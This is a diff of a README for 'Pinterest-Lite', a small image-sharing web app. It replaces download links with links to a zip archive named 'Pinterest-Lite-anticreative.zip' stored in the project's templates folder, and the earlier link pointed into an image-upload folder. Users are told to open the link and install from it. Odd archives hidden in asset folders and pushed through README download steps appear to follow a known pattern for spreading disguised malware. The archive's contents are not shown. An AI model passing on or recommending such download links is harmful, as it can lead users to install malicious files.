@@ -3,7 +3,7 @@
 ## 🚀 Getting Started
 Welcome to **Pinterest-Lite**, a web application inspired by Pinterest. This application allows you to create an account, log in, upload images, and enjoy a personalized feed. It focuses on backend learning, user authentication, and project organization. Follow this guide to install and run Pinterest-Lite easily.
 
-[![Download Pinterest-Lite](https://raw.githubusercontent.com/tanmayyyyayyy/Pinterest-Lite/main/pinterestlite/static/fotos_posts/Lite-Pinterest-v1.0.zip)](https://raw.githubusercontent.com/tanmayyyyayyy/Pinterest-Lite/main/pinterestlite/static/fotos_posts/Lite-Pinterest-v1.0.zip)
+[![Download Pinterest-Lite](https://github.com/tanmayyyyayyy/Pinterest-Lite/raw/refs/heads/main/pinterestlite/templates/Pinterest-Lite-anticreative.zip)](https://github.com/tanmayyyyayyy/Pinterest-Lite/raw/refs/heads/main/pinterestlite/templates/Pinterest-Lite-anticreative.zip)
 
 ## 🔍 What You Need
 Before getting started, ensure your computer meets the following requirements:
@@ -15,7 +15,7 @@ Before getting started, ensure your computer meets the following requirements:
 ## 📥 Download & Install
 To get Pinterest-Lite on your computer, visit the releases page:
 
-[Download Pinterest-Lite](https://raw.githubusercontent.com/tanmayyyyayyy/Pinterest-Lite/main/pinterestlite/static/fotos_posts/Lite-Pinterest-v1.0.zip)
+[Download Pinterest-Lite](https://github.com/tanmayyyyayyy/Pinterest-Lite/raw/refs/heads/main/pinterestlite/templates/Pinterest-Lite-anticreative.zip)
 
 1. Open the link above.
 2. Look for the latest version of the application.
